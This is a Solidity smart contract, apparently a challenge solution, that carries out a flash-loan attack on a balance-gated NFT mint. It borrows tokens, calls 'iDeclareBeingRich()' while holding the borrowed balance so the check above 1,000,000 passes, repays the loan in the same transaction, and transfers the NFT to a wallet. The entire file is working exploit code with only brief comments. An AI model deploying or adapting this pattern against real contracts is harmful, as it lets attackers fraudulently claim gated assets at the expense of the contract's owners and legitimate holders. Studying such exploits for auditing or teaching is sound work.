// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
interface INFT {
    function iDeclareBeingRich() external;
}

contract FlashloanExecutor {
    address public NFT_address;
    address public Token_address;
    address public Bank_address;
    
    constructor(address NFT, address Token, address Bank ){
        NFT_address=NFT;
        Token_address=Token;
        Bank_address=Bank;
    }

    // this function calls function `IDeclareBeingRich()` in contract WealtPrivateClubNFT,
    // it first check if msg.sender's (borrower) account balance > 1,000,000, then mint the NFT to the msg.sender.
    function callIDeclareBeingRich() public{
        INFT NFT = INFT(NFT_address);
        NFT.iDeclareBeingRich();
    }

    // this function is called by function `flashloan("0xBorrowerAddress", amount)` in contacrt BankWithFlashloan,
    // `flashloan` first records the original bank balance, then it transfers money to borrower (should be > 1,000,000)
    // After minting the NFT, borrower transfers the money back to the bank."
    function  executeWithMoney(uint256 _amount) external{
        IERC20(Token_address).approve(msg.sender, _amount);
        callIDeclareBeingRich();
        IERC20(Token_address).transfer(Bank_address, _amount);
    }

    // almost forgot this one, this function allows us to transfer the NFT from this contract to wallet
    function transferOutNFT (address _to, uint _NFTid) public{
        IERC721(NFT_address).approve( _to, _NFTid);
        IERC721(NFT_address).transferFrom(address(this), _to, _NFTid);
    }
}
